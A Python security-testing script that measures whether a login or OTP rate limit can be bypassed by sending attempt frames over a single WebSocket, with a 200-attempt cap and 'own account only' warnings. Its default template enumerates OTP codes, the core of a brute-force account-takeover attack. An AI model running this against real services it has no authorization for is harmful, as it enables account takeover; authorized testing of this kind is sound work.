#!/usr/bin/env python3
"""
ws_ratelimit_test.py — measure a rate-limit bypass over WebSockets (benign proof, no real brute).

HTTP rate limits frequently DON'T apply to WebSocket messages, so a login/OTP gate that's throttled
over HTTP can be unlimited over the socket (guide §10). This helper sends a BOUNDED number of attempt
frames on ONE socket and reports how many were PROCESSED (the server evaluated them = the cap didn't
stop them) vs BLOCKED (a throttle/lockout reply, or no reply) — the proof that the per-request cap is
bypassed — WITHOUT cracking a real account. A normal 'invalid OTP' reply counts as PROCESSED.

Authorized testing only. Your own account. Keep --count small. The point is the measured count, not
a real brute. Tune --template / --throttle / --success to the app's frames.
"""
import argparse, asyncio, inspect, sys
try:
    import websockets
except ImportError:
    sys.exit("pip install websockets")

# websockets v14 renamed connect(extra_headers=) -> connect(additional_headers=); support both.
try:
    _HDR_KW = ("additional_headers"
               if "additional_headers" in inspect.signature(websockets.connect).parameters
               else "extra_headers")
except (ValueError, TypeError):
    _HDR_KW = "extra_headers"


async def run(args):
    headers = {}
    if args.cookie:
        headers["Cookie"] = args.cookie
    if args.count > 200:
        sys.exit("Refusing count > 200 — a measured bypass needs a reasonable number, not a real brute.")

    processed = 0     # the server EVALUATED the attempt (a normal reply) -> the limiter did NOT stop it
    blocked = 0       # throttled / locked / dropped (a --throttle reply, or no reply at all)
    successes = 0
    print(f"[*] one socket, {args.count} attempts — measuring rate-limit bypass (own account only)")
    try:
        async with websockets.connect(args.url, open_timeout=15, **{_HDR_KW: headers}) as ws:
            for i in range(args.count):
                frame = args.template.replace("{i}", str(i).zfill(args.width))
                try:
                    await ws.send(frame)
                    reply = await asyncio.wait_for(ws.recv(), timeout=args.wait)
                except asyncio.TimeoutError:
                    reply = None                       # no reply within --wait -> treat as blocked/dropped
                except Exception as e:                 # socket closed/reset mid-run -> hard block; stop
                    blocked += 1
                    print(f"[!] socket dropped after {i} sent attempts ({e}) -> looks like a hard block")
                    break
                # A NORMAL reply (even 'invalid OTP') means the attempt was PROCESSED = the cap didn't stop it.
                # Only a throttle/lockout reply (--throttle) or NO reply counts as blocked. TUNE --throttle/--success.
                low = "" if reply is None else str(reply).lower()
                if reply is None or (args.throttle and args.throttle.lower() in low):
                    blocked += 1
                else:
                    processed += 1
                    if args.success and args.success.lower() in low:
                        successes += 1             # the winning guess (own account) — confirms the gate is live
    except Exception as e:
        print(f"[!] connection failed: {e}")
        return

    print(f"\n-- processed (cap did NOT stop): {processed}   blocked/throttled: {blocked}   of {args.count}")
    if args.success:
        print(f"-- replies matching success signal '{args.success}': {successes}")
    if processed > 5 and (not args.cap or processed > args.cap):
        print(f"-> {processed} attempts processed on ONE socket"
              + (f" (HTTP cap is {args.cap})" if args.cap else "")
              + " -> RATE-LIMIT BYPASS over WebSocket -> brute feasible -> ATO chain (guide §10).")
    else:
        print("-> Looks throttled / limited over WS (few processed), or the throttle signal needs tuning (--throttle).")


def main():
    p = argparse.ArgumentParser(description="Measure WS rate-limit bypass (authorized testing only).")
    p.add_argument("--url", required=True)
    p.add_argument("--cookie", help="Cookie header for your own account")
    p.add_argument("--template", default='{"type":"verifyOtp","code":"{i}"}',
                   help="frame template; {i} is the attempt index (default OTP example)")
    p.add_argument("--width", type=int, default=3, help="zero-pad width for {i} (default 3 -> 000..)")
    p.add_argument("--throttle", help="substring marking a THROTTLED/locked reply (e.g. 'too many','rate limit','429','locked'); default: rely on no-reply/timeout as the block signal")
    p.add_argument("--success", help="(optional) substring marking a SUCCESS reply (the winning guess)")
    p.add_argument("--cap", type=int, help="(optional) the documented HTTP attempt cap, for the report line")
    p.add_argument("--count", type=int, default=50, help="bounded attempts (default 50)")
    p.add_argument("--wait", type=float, default=2.0, help="seconds to wait per reply")
    asyncio.run(run(p.parse_args()))


if __name__ == "__main__":
    main()
